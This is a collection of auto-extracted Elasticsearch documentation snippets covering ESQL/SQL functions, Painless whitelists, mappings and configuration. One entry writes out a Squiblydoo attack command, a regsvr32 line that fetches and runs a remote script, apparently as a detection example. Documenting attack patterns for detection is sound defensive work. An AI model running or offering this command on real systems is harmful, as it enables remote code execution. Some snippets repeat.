  Integer quarter(Object, String)
  Integer weekOfYear(Object, String)
  ZonedDateTime dateAdd(String, Integer, Object, String)
  Integer dateDiff(String, Object, Object, String)
  def dateTrunc(String, Object, String)
  def dateParse(String, String, String)
  Integer datePart(String, Object, String)
  String dateFormat(Object, String, String)
  String dateTimeFormat(Object, String, String)
  String format(Object, String, String)
  String toChar(Object, String, String)
  def dateTimeParse(String, String, String)
  def timeParse(String, String, String)
  IntervalDayTime intervalDayTime(String, String)
  IntervalYearMonth intervalYearMonth(String, String)
  ZonedDateTime asDateTime(Object)
  OffsetTime asTime(String)

  Integer ascii(String)
  Integer bitLength(String)
  String  character(Number)
  Integer charLength(String)
  String  concat(String, String)
  String  insert(String, Number, Number, String)
  String  lcase(String)
  String  left(String, Number)
  Integer length(String)
  Integer locate(String, String)
  Integer locate(String, String, Number)
  String  ltrim(String)
  Integer octetLength(String)
  Integer position(String, String)
  String  repeat(String, Number)
  String  replace(String, String, String)
  String  right(String, Number)
  String  rtrim(String)
  String  space(Number)
  String  substring(String, Number, Number)
  String  trim(String)
  String  ucase(String)

  GeoShape geoDocValue(java.util.Map, String)
  String   stAswkt(Object)
  Double   stDistance(Object, Object)
  String   stGeometryType(Object)
  GeoShape stWktToSql(String)
  Double   stX(Object)
  Double   stY(Object)
  Double   stZ(Object)

  def cast(Object, String)
}

----------------------------------------

TITLE: Using Comparison Operators in Elasticsearch SQL
DESCRIPTION: Shows how to use comparison operators (<, <=, >, >=) for range-based filtering.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE emp_no < 10003 ORDER BY emp_no LIMIT 5;

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet describes the parameters for an ESQL function. It specifies a single parameter 'str' which is a string expression, and notes that the function returns null if the input is null.

LANGUAGE: markdown
CODE:
**Parameters**

`str`
:   String expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Installing Elasticsearch Phonetic Analysis Plugin
DESCRIPTION: Command to install the phonetic analysis plugin using Elasticsearch's plugin manager. Must be run with sudo privileges and requires node restart after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install analysis-phonetic

----------------------------------------

TITLE: Calculating Maximum Value in ESQL
DESCRIPTION: This snippet demonstrates how to use the MAX function to find the maximum value in a column. It calculates the maximum number of languages known by employees.

LANGUAGE: esql
CODE:
FROM employees
| STATS MAX(languages)

----------------------------------------

TITLE: Defining ESQL Weighted Average Function
DESCRIPTION: Specifies the weighted average function that calculates the numeric average weighted by specified values. This is an auto-generated documentation file that should not be manually edited.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Configuring Dot Expander Processor in Elasticsearch
DESCRIPTION: This snippet shows the basic configuration for the dot expander processor. It expands a field named 'foo.bar' into an object field.

LANGUAGE: json
CODE:
{
  "dot_expander": {
    "field": "foo.bar"
  }
}

----------------------------------------

TITLE: Including SHA256 Function Parameters in Markdown
DESCRIPTION: This snippet uses an include directive to insert the parameters documentation for the SHA256 function from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/sha256.md
:::

----------------------------------------

TITLE: Using Safe Scheduled Thread Pool Executor in Elasticsearch
DESCRIPTION: Recommends extending org.elasticsearch.threadpool.Scheduler.SafeScheduledThreadPoolExecutor instead of using Java's ScheduledThreadPoolExecutor to properly handle Errors.

LANGUAGE: java
CODE:
@defaultMessage extend org.elasticsearch.threadpool.Scheduler.SafeScheduledThreadPoolExecutor instead which will properly bubble up Errors
java.util.concurrent.ScheduledThreadPoolExecutor#<init>(int)
java.util.concurrent.ScheduledThreadPoolExecutor#<init>(int, java.util.concurrent.ThreadFactory)
java.util.concurrent.ScheduledThreadPoolExecutor#<init>(int, java.util.concurrent.RejectedExecutionHandler)
java.util.concurrent.ScheduledThreadPoolExecutor#<init>(int, java.util.concurrent.ThreadFactory, java.util.concurrent.RejectedExecutionHandler)

----------------------------------------

TITLE: Indexing a LineString shape in GeoJSON format
DESCRIPTION: Example of indexing a linestring shape using the GeoJSON format in Elasticsearch. LineStrings are defined by an array of two or more positions.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "linestring",
    "coordinates" : [[-377.03653, 389.897676], [-377.009051, 389.889939]]
  }
}

----------------------------------------

TITLE: Configuring Ingest Pipeline for DateTime Processing
DESCRIPTION: Creates an ingest pipeline with a script processor that parses date and time fields to create a standardized datetime field. The script handles PM/AM conversion and proper date formatting.

LANGUAGE: console
CODE:
PUT /_ingest/pipeline/seats
{
  "description": "update datetime for seats",
  "processors": [
    {
      "script": {
        "source": "String[] dateSplit = ctx.date.splitOnToken('-'); String year = dateSplit[0].trim(); String month = dateSplit[1].trim(); if (month.length() == 1) { month = '0' + month; } String day = dateSplit[2].trim(); if (day.length() == 1) { day = '0' + day; } boolean pm = ctx.time.substring(ctx.time.length() - 2).equals('PM'); String[] timeSplit = ctx.time.substring(0, ctx.time.length() - 2).splitOnToken(':'); int hours = Integer.parseInt(timeSplit[0].trim()); int minutes = Integer.parseInt(timeSplit[1].trim()); if (pm) { hours += 12; } String dts = year + '-' + month + '-' + day + 'T' + (hours < 10 ? '0' + hours : '' + hours) + ':' + (minutes < 10 ? '0' + minutes : '' + minutes) + ':00+08:00'; ZonedDateTime dt = ZonedDateTime.parse(dts, DateTimeFormatter.ISO_OFFSET_DATE_TIME); ctx.datetime = dt.getLong(ChronoField.INSTANT_SECONDS)*1000L;"
      }
    }
  ]
}

----------------------------------------

TITLE: Whitelisting BytesRefSortScript Class and Factory for Painless Scripting in Elasticsearch
DESCRIPTION: This snippet whitelists the org.elasticsearch.script.BytesRefSortScript class and its associated Factory class for use in Painless scripts. The @no_import annotation prevents direct importing of these classes.

LANGUAGE: painless
CODE:
class org.elasticsearch.script.BytesRefSortScript @no_import {
}
class org.elasticsearch.script.BytesRefSortScript$Factory @no_import {
}

----------------------------------------

TITLE: Querying a search_as_you_type Field with match_phrase_prefix in Elasticsearch
DESCRIPTION: This snippet shows how to use a match_phrase_prefix query on a search_as_you_type field for strict matching of query terms in order. This approach may be less efficient than using match_bool_prefix.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "match_phrase_prefix": {
      "my_field": "brown f"
    }
  }
}

----------------------------------------

TITLE: Using COALESCE Function in ESQL
DESCRIPTION: Demonstrates how COALESCE evaluates multiple arguments and returns the first non-null value. In this example, it checks a null value 'a' and string value 'b', returning 'b' as the result.

LANGUAGE: esql
CODE:
ROW a=null, b="b"
| EVAL COALESCE(a, b)

----------------------------------------

TITLE: Creating Index Template for Data Stream
DESCRIPTION: Creates an index template with data stream enabled to store Windows event log data.

LANGUAGE: console
CODE:
PUT /_index_template/my-data-stream-template
{
  "index_patterns": [ "my-data-stream*" ],
  "data_stream": { },
  "priority": 500
}

----------------------------------------

TITLE: SQL Numeric Literals Examples
DESCRIPTION: Demonstrates various formats of numeric literals including integer, decimal, and scientific notation.

LANGUAGE: sql
CODE:
1969    -- integer notation
3.14    -- decimal notation
.1234   -- decimal notation starting with decimal point
4E5     -- scientific notation (with exponent marker)
1.2e-3  -- scientific notation with decimal point

----------------------------------------

TITLE: Configuring Data Path in Elasticsearch YAML
DESCRIPTION: Specifies the directory path where Elasticsearch will store its data using the path.data setting in elasticsearch.yml.

LANGUAGE: yaml
CODE:
path.data:  /var/elasticsearch/data

----------------------------------------

TITLE: Running End-to-End Tests
DESCRIPTION: Commands for running functional tests for the Google Cloud Storage connector.

LANGUAGE: shell
CODE:
$ make ftest NAME=google_cloud_storage

LANGUAGE: shell
CODE:
make ftest NAME=google_cloud_storage DATA_SIZE=small

----------------------------------------

TITLE: Calculating Base 10 Logarithm in ESQL
DESCRIPTION: This snippet demonstrates how to use the LOG10 function in ESQL to calculate the base 10 logarithm of a numeric value. The function takes a numeric input and returns a double value. It handles edge cases by returning null for 0 and negative numbers, accompanied by a warning.

LANGUAGE: sql
CODE:
ROW d = 1000.0
| EVAL s = LOG10(d)

----------------------------------------

TITLE: Script-based Value Count Aggregation with Runtime Fields
DESCRIPTION: Shows how to use runtime fields with value count aggregation for complex counting scenarios. The script emits values based on the 'type' field and a conditional 'promoted' field check.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "runtime_mappings": {
    "tags": {
      "type": "keyword",
      "script": """
        emit(doc['type'].value);
        if (doc['promoted'].value) {
          emit('hot');
        }
      """
    }
  },
  "aggs": {
    "tags_count": {
      "value_count": {
        "field": "tags"
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Base 10 Logarithm in ESQL
DESCRIPTION: This snippet demonstrates how to use the LOG10 function in ESQL to calculate the base 10 logarithm of a numeric value. The function takes a numeric input and returns a double value. It handles edge cases by returning null for 0 and negative numbers, accompanied by a warning.

LANGUAGE: sql
CODE:
ROW d = 1000.0
| EVAL s = LOG10(d)

----------------------------------------

TITLE: Creating API Key for Oracle Connector
DESCRIPTION: API request to generate a security API key for the Oracle connector with required permissions.

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Boolean NOT Operator Implementation in Painless
DESCRIPTION: Demonstrates the boolean NOT operator (!) that flips boolean values from true to false and vice versa. Shows usage with both boolean and def types.

LANGUAGE: painless
CODE:
boolean x = !false;
boolean y = !x;

LANGUAGE: painless
CODE:
def y = true;
def z = !y;

----------------------------------------

TITLE: Example Squiblydoo Attack Command
DESCRIPTION: Shows a typical regsvr32 command used in Squiblydoo attacks.

LANGUAGE: sh
CODE:
"regsvr32.exe  /s /u /i:<script-url> scrobj.dll"

----------------------------------------

TITLE: Creating an Elasticsearch Index with Range Fields
DESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with integer_range and date_range field types, and insert a sample document.

LANGUAGE: console
CODE:
PUT range_index
{
  "settings": {
    "number_of_shards": 2
  },
  "mappings": {
    "properties": {
      "expected_attendees": {
        "type": "integer_range"
      },
      "time_frame": {
        "type": "date_range",
        "format": "yyyy-MM-dd||epoch_millis"
      }
    }
  }
}

PUT range_index/_doc/1?refresh
{
  "expected_attendees" : {
    "gte" : 10,
    "lte" : 20
  },
  "time_frame" : {
    "gte" : "2019-10-28",
    "lte" : "2019-11-04"
  }
}

----------------------------------------

TITLE: Elasticsearch Response with Processed User Agent Information
DESCRIPTION: This snippet shows the response from Elasticsearch after processing a document with the user_agent processor. It includes the original user agent string and the extracted information such as browser name, version, operating system, and device.

LANGUAGE: console-result
CODE:
{
  "found": true,
  "_index": "my-index-000001",
  "_id": "my_id",
  "_version": 1,
  "_seq_no": 22,
  "_primary_term": 1,
  "_source": {
    "agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "user_agent": {
      "name": "Chrome",
      "original": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
      "version": "51.0.2704.103",
      "os": {
        "name": "Mac OS X",
        "version": "10.10.5",
        "full": "Mac OS X 10.10.5"
      },
      "device" : {
        "name" : "Mac"
      }
    }
  }
}

----------------------------------------

TITLE: Internal QL Script Utils Class
DESCRIPTION: Utility class containing core SQL operations including document value access, comparison operations, logical operations, and basic mathematical functions

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.ql.expression.function.scalar.whitelist.InternalQlScriptUtils {
  def docValue(java.util.Map, String)
  boolean nullSafeFilter(Boolean)
  double nullSafeSortNumeric(Number)
  String nullSafeSortString(Object)

  Boolean startsWith(String, String, Boolean)

  Boolean eq(Object, Object)
  Boolean nulleq(Object, Object)
  Boolean neq(Object, Object)
  Boolean lt(Object, Object)
  Boolean lte(Object, Object)
  Boolean gt(Object, Object)
  Boolean gte(Object, Object)
  Boolean in(Object, java.util.List)

  Boolean and(Boolean, Boolean)
  Boolean or(Boolean, Boolean)
  Boolean not(Boolean)
  Boolean isNull(Object)
  Boolean isNotNull(Object)

  Boolean regex(String, String)
  Boolean regex(String, String, Boolean)

  Number neg(Number)
}

----------------------------------------

TITLE: Documenting Parameters for Elasticsearch SQL Function Test
DESCRIPTION: This snippet defines the parameters for an Elasticsearch SQL function test case. It specifies a 'field' parameter which is a multivalue expression.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Multivalue expression.

----------------------------------------

TITLE: Unsupported Scalar Function on Nested Fields in WHERE Clause
DESCRIPTION: Shows an example of an unsupported query using a scalar function on a nested field in the WHERE clause.

LANGUAGE: sql
CODE:
SELECT * FROM test_emp WHERE LENGTH(dep.dep_name.keyword) > 5;

----------------------------------------

TITLE: Calculating Average of Multi-Value Field using MV_AVG in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the MV_AVG function to calculate the average of values in a multi-value field 'a'. The function is applied within an EVAL clause to create a new field 'avg_a' containing the result.

LANGUAGE: esql
CODE:
ROW a=[3, 5, 1, 6]
| EVAL avg_a = MV_AVG(a)

----------------------------------------

TITLE: Synopsis of elasticsearch-users CLI Commands in Shell
DESCRIPTION: This snippet shows the general syntax for using the elasticsearch-users command-line tool. It includes options for adding users, listing users, changing passwords, managing roles, and deleting users.

LANGUAGE: shell
CODE:
bin/elasticsearch-users
([useradd <username>] [-p <password>] [-r <roles>]) |
([list] <username>) |
([passwd <username>] [-p <password>]) |
([roles <username>] [-a <roles>] [-r <roles>]) |
([userdel <username>])

----------------------------------------

TITLE: Analyzing Text with Custom ICU Tokenizer
DESCRIPTION: Example response showing how the custom ICU tokenizer processes text. The result shows the entire input being treated as a single token based on the custom rules.

LANGUAGE: json
CODE:
{
   "tokens": [
      {
         "token": "Elasticsearch. Wow!",
         "start_offset": 0,
         "end_offset": 19,
         "type": "<ALPHANUM>",
         "position": 0
      }
   ]
}

----------------------------------------

TITLE: Initializing Index and Adding Data for Shape Field Aggregation
DESCRIPTION: This snippet creates an index with a shape field and adds geometries to demonstrate the cartesian-centroid aggregation on shape fields.

LANGUAGE: console
CODE:
PUT /places
{
  "mappings": {
    "properties": {
      "geometry": {
        "type": "shape"
      }
    }
  }
}

POST /places/_bulk?refresh
{"index":{"_id":1}}
{"name": "NEMO Science Museum", "geometry": "POINT(491.2350 5237.4081)" }
{"index":{"_id":2}}
{"name": "Sportpark De Weeren", "geometry": { "type": "Polygon", "coordinates": [ [ [ 496.5305328369141, 5239.347642069457 ], [ 496.6979026794433, 5239.1721758934835 ], [ 496.9425201416015, 5239.238958618537 ], [ 496.7944622039794, 5239.420969150824 ], [ 496.5305328369141, 5239.347642069457 ] ] ] } }

----------------------------------------

TITLE: Remove Allocation Filter
DESCRIPTION: Example of using cluster settings API to remove node exclusion after migration

LANGUAGE: json
CODE:
PUT _cluster/settings
{
  "persistent": {
    "cluster.routing.allocation.exclude._name": null
  }
}

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text for applying the Apache License to a work. Fields in brackets should be replaced with specific project information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Defining Unsigned Long Field in Elasticsearch Mapping
DESCRIPTION: This snippet demonstrates how to define an unsigned long field named 'my_counter' in an Elasticsearch index mapping.

LANGUAGE: console
CODE:
PUT my_index
{
  "mappings": {
    "properties": {
      "my_counter": {
        "type": "unsigned_long"
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Index-Level ILM Settings in Elasticsearch
DESCRIPTION: Index-specific ILM settings that control individual index lifecycle policies, origination dates, rollover behavior, and wait time thresholds. These settings are typically configured through index templates.

LANGUAGE: yaml
CODE:
index.lifecycle.indexing_complete: false
index.lifecycle.name: "policy_name"
index.lifecycle.origination_date: 1609459200000
index.lifecycle.parse_origination_date: true
index.lifecycle.step.wait_time_threshold: "12h"
index.lifecycle.rollover_alias: "my_alias"

----------------------------------------

TITLE: Static Import Configuration for Long Field Emit Function
DESCRIPTION: Configures static import binding for the emit callback function used to collect long field values, binding it to the LongFieldScript.Emit implementation.

LANGUAGE: painless
CODE:
static_import {
    void emit(org.elasticsearch.script.LongFieldScript, long) bound_to org.elasticsearch.script.LongFieldScript$Emit
}

----------------------------------------

TITLE: Defining InternalQlScriptUtils Class for EQL Scripting in Java
DESCRIPTION: This class provides utility methods for EQL scripting, including document value handling, comparisons, logical operations, regex, and math functions. It's part of the whitelist for EQL scripting in Elasticsearch.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.ql.expression.function.scalar.whitelist.InternalQlScriptUtils {

  def docValue(java.util.Map, String)
  boolean nullSafeFilter(Boolean)
  double nullSafeSortNumeric(Number)
  String nullSafeSortString(Object)
  Number nullSafeCastNumeric(Number, String)
  Number nullSafeCastToUnsignedLong(Number)

  Boolean startsWith(String, String, Boolean)

  Boolean eq(Object, Object)
  Boolean nulleq(Object, Object)
  Boolean neq(Object, Object)
  Boolean lt(Object, Object)
  Boolean lte(Object, Object)
  Boolean gt(Object, Object)
  Boolean gte(Object, Object)
  Boolean in(Object, java.util.List)

  Boolean and(Boolean, Boolean)
  Boolean or(Boolean, Boolean)
  Boolean not(Boolean)
  Boolean isNull(Object)
  Boolean isNotNull(Object)

  Boolean regex(String, String)
  Boolean regex(String, String, Boolean)

  Number add(Number, Number)
  Number div(Number, Number)
  Number mod(Number, Number)
  Number mul(Number, Number)
  Number neg(Number)
  Number sub(Number, Number)
}

----------------------------------------

TITLE: Basic Transport Profile Configuration
DESCRIPTION: Example YAML configuration showing how to bind to multiple ports on different interfaces using transport profiles

LANGUAGE: yaml
CODE:
transport.profiles.default.port: 9300-9400
transport.profiles.default.bind_host: 10.0.0.1
transport.profiles.client.port: 9500-9600
transport.profiles.client.bind_host: 192.168.0.1
transport.profiles.dmz.port: 9700-9800
transport.profiles.dmz.bind_host: 172.16.1.2

----------------------------------------

TITLE: Using DATE_DIFF Function
DESCRIPTION: Examples of using DATE_DIFF function to calculate the difference between two dates in various units.

LANGUAGE: sql
CODE:
SELECT DATE_DIFF('years', '2019-09-04T11:22:33.000Z'::datetime, '2032-09-04T22:33:11.000Z'::datetime) AS "diffInYears";

LANGUAGE: sql
CODE:
SELECT DATE_DIFF('week', '2019-09-04T11:22:33.000Z'::datetime, '2016-12-08T22:33:11.000Z'::datetime) AS "diffInWeeks";

LANGUAGE: sql
CODE:
SELECT DATE_DIFF('seconds', '2019-09-04T11:22:33.123Z'::datetime, '2019-07-12T22:33:11.321Z'::datetime) AS "diffInSeconds";

LANGUAGE: sql
CODE:
SELECT DATE_DIFF('qq', '2019-09-04'::date, '2025-04-25'::date) AS "diffInQuarters";

LANGUAGE: sql
CODE:
SELECT DATEDIFF('hours', '2019-11-10T12:10:00.000Z'::datetime, '2019-11-10T23:59:59.999Z'::datetime) AS "diffInHours";

LANGUAGE: sql
CODE:
SELECT DATEDIFF('minute', '2019-11-10T12:10:00.000Z'::datetime, '2019-11-10T12:15:59.999Z'::datetime) AS "diffInMinutes";

LANGUAGE: sql
CODE:
SELECT DATE_DIFF('minutes', '2019-09-04'::date, '2015-08-17T22:33:11.567Z'::datetime) AS "diffInMinutes";

----------------------------------------

TITLE: ESQL Least Function Parameter Documentation
DESCRIPTION: Documents the required parameters for the ESQL least function including the first parameter and remaining parameters for evaluation.

LANGUAGE: markdown
CODE:
**Parameters**

`first`
:   First of the columns to evaluate.

`rest`
:   The rest of the columns to evaluate.

----------------------------------------

TITLE: Querying Nested Fields in Elasticsearch SQL
DESCRIPTION: Demonstrates how to reference nested fields in Elasticsearch SQL queries by using the dot notation to access sub-fields.

LANGUAGE: sql
CODE:
SELECT dep.dep_name.keyword FROM test_emp GROUP BY languages;

----------------------------------------

TITLE: Documenting ESQL Function Parameter in Markdown
DESCRIPTION: This snippet defines the 'number' parameter for an ESQL function. It specifies that the parameter should be an expression that outputs values to be averaged.

LANGUAGE: markdown
CODE:
`number`
:   Expression that outputs values to average.

----------------------------------------

TITLE: SQL DESCRIBE TABLE Syntax
DESCRIPTION: Defines the syntax for the DESCRIBE TABLE command in Elasticsearch SQL. Supports optional catalog identifier, frozen indices inclusion, and table identification through direct names or pattern matching.

LANGUAGE: sql
CODE:
DESCRIBE | DESC
    [CATALOG identifier]? <1>
    [INCLUDE FROZEN]?     <2>
    [table_identifier |   <3>
     LIKE pattern]        <4>

----------------------------------------

TITLE: Listing Elasticsearch Service Tokens
DESCRIPTION: Command to list all service account tokens defined in the service_tokens file.

LANGUAGE: shell
CODE:
bin/elasticsearch-service-tokens list

----------------------------------------

TITLE: Documentation Structure for MV_MAX Function
DESCRIPTION: Markdown structure defining the documentation layout for the MV_MAX function in ESQL, including sections for syntax, parameters, description, types and examples.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `MV_MAX` [esql-mv_max]

**Syntax**

:::{image} ../../../images/functions/mv_max.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/mv_max.md
:::

:::{include} ../description/mv_max.md
:::

:::{include} ../types/mv_max.md
:::

:::{include} ../examples/mv_max.md
:::

----------------------------------------

TITLE: Configuring Synthetic Source with Annotated Text
DESCRIPTION: Examples showing how to configure synthetic _source with annotated_text fields, including stored and non-stored variations.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "text": {
        "type": "annotated_text",
        "fields": {
          "raw": {
            "type": "keyword"
          }
        }
      }
    }
  }
}

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "text": { "type": "annotated_text", "store": true }
    }
  }
}

----------------------------------------

TITLE: Setting Machine Learning Circuit Breaker in Elasticsearch
DESCRIPTION: YAML configuration for the machine learning circuit breaker in Elasticsearch. It includes settings for the limit, overhead, and type.

LANGUAGE: yaml
CODE:
breaker.model_inference.limit: "50%"
breaker.model_inference.overhead: 1
breaker.model_inference.type: "memory"

----------------------------------------

TITLE: Combining MAX and MV_AVG Functions in ESQL
DESCRIPTION: This example shows how to use the MAX function with an inline function MV_AVG. It calculates the maximum of the average salary changes across multiple values per row.

LANGUAGE: esql
CODE:
FROM employees
| STATS max_avg_salary_change = MAX(MV_AVG(salary_change))

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License to a work. The template includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
Copyright {yyyy} {name of copyright owner}

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Documentation Markdown for ESQL Point Parameter
DESCRIPTION: Documents the 'point' parameter which accepts geometric data types and defines null handling behavior. The parameter supports geo_point, geo_shape, cartesian_point and cartesian_shape data types.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`point`
:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.

----------------------------------------

TITLE: Certificate Utility Functions - Environment Check
DESCRIPTION: Validates that ES_HOME environment variable is set and points to a valid directory

LANGUAGE: bash
CODE:
[ -n "$ES_HOME" ] || { printf '%s: $ES_HOME is not set\n' "$0" ; exit 1; }
[ -d "$ES_HOME" ] || { printf '%s: $ES_HOME is not a directory\n' "$0" ; exit 1; }

----------------------------------------

TITLE: kNN Retriever Example in Elasticsearch
DESCRIPTION: Shows how to use a kNN retriever to perform a vector similarity search on a 'vector' field.

LANGUAGE: console
CODE:
GET /restaurants/_search
{
  "retriever": {
    "knn": {
      "field": "vector",
      "query_vector": [10, 22, 77],
      "k": 10,
      "num_candidates": 10
    }
  }
}

----------------------------------------

TITLE: Change Point Aggregation Response Example
DESCRIPTION: Illustrates the structure of a response from a change point aggregation, showing the detected change point bucket details and statistical information about the change.

LANGUAGE: json
CODE:
{
    "change_points_avg": {
      "bucket": {
        "key": "2023-04-29T00:00:00.000Z",
        "doc_count": 329,
        "avg": {
          "value": 4737.209726443769
        }
      },
      "type": {
        "dip": {
          "p_value": 3.8999455212466465e-10,
          "change_point": 41
        }
      }
    }
}

----------------------------------------

TITLE: ESQL Numeric Type Mapping Table
DESCRIPTION: Documentation table showing how different numeric input types (double, integer, long, unsigned_long) are mapped to double output type in ESQL functions. This mapping is automatically generated by the AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Defining Whitelisted Processor Methods for Painless in Java
DESCRIPTION: Defines a set of static processor methods that are allowed to be called from Painless scripts in Elasticsearch. Includes methods for string manipulation, JSON processing, URL handling, and community ID generation.

LANGUAGE: java
CODE:
class org.elasticsearch.ingest.common.Processors {
  long bytes(String)
  String lowercase(String)
  String uppercase(String)
  Object json(Object)
  Object jsonLenient(Object)
  void json(Map, String)
  void jsonLenient(Map, String)
  String urlDecode(String)
  String communityId(String, String, Object, Object, Object, Object, Object, Object, int)
  String communityId(String, String, Object, Object, Object, Object, Object, Object)
  Map uriParts(String)
}

----------------------------------------

TITLE: Calculating Hyperbolic Cosine with COSH in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the COSH function in Elasticsearch ESQL to calculate the hyperbolic cosine of a number. It creates a row with a value and then applies the COSH function to that value.

LANGUAGE: sql
CODE:
ROW a=1.8
| EVAL cosh=COSH(a)

----------------------------------------

TITLE: Querying Data with FROM in ESQL
DESCRIPTION: The FROM source command returns a table with data from a data stream, index, or alias. It supports wildcards and date math in the index pattern.

LANGUAGE: esql
CODE:
FROM employees

LANGUAGE: esql
CODE:
FROM <logs-{now/d}>

LANGUAGE: esql
CODE:
FROM employees-00001,other-employees-*

----------------------------------------

TITLE: Querying Data with FROM in ESQL
DESCRIPTION: The FROM source command returns a table with data from a data stream, index, or alias. It supports wildcards and date math in the index pattern.

LANGUAGE: esql
CODE:
FROM employees

LANGUAGE: esql
CODE:
FROM <logs-{now/d}>

LANGUAGE: esql
CODE:
FROM employees-00001,other-employees-*

----------------------------------------

TITLE: Network Direction Processor Simulation Result in Elasticsearch
DESCRIPTION: This snippet shows the expected output of the network direction processor simulation. The processor has added a 'network.direction' field to the document, indicating that the traffic is 'inbound' based on the provided IP addresses and internal network configuration.

LANGUAGE: json
CODE:
{
  "docs": [
    {
      "doc": {
        ...
        "_source": {
          "destination": {
            "ip": "192.168.1.1"
          },
          "source": {
            "ip": "128.232.110.120"
          },
          "network": {
            "direction": "inbound"
          }
        }
      }
    }
  ]
}

----------------------------------------

TITLE: Input Document for JSON Processor Without Target Field in Elasticsearch
DESCRIPTION: This snippet demonstrates an input document for the JSON processor when no target field is specified.

LANGUAGE: json
CODE:
{
  "source_and_target": "{\"foo\": 2000}"
}

----------------------------------------

TITLE: Setting Transform Failure Retries in Elasticsearch YAML
DESCRIPTION: This YAML configuration sets the number of times a transform retries on non-fatal errors. The default is 10, with a valid range of 0 to 100. This setting can be applied cluster-wide or per individual transform.

LANGUAGE: yaml
CODE:
xpack.transform.num_transform_failure_retries: 10

----------------------------------------

TITLE: Docker Run Command for Connector Service
DESCRIPTION: Shell command to run the Jira connector Docker container

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Creating Index with Sparse Vector Mapping
DESCRIPTION: Example of creating an Elasticsearch index with a sparse_vector field mapping for text tokens.

LANGUAGE: console
CODE:
PUT my-index
{
  "mappings": {
    "properties": {
      "text.tokens": {
        "type": "sparse_vector"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Elasticsearch Index (Version 5)
DESCRIPTION: Creates an Elasticsearch index with specific settings and mappings for version 5, including shard and replica configurations, and field definitions.

LANGUAGE: json
CODE:
PUT /index
{
  "settings": {
    "number_of_shards": 1,
    "number_of_replicas": 1
  },
  "mappings": {
    "my_type": {
      "properties": {
        "title": {
          "type": "text"
        },
        "created_at": {
          "type": "date"
        },
        "views": {
          "type": "integer"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Demonstrating REPEAT Function in Elasticsearch SQL
DESCRIPTION: This snippet shows how to use the REPEAT function in ESQL. It creates a row with a string value 'Hello!' and then uses REPEAT to create a new column 'triple_a' containing the original string repeated three times.

LANGUAGE: sql
CODE:
ROW a = "Hello!"
| EVAL triple_a = REPEAT(a, 3)

----------------------------------------

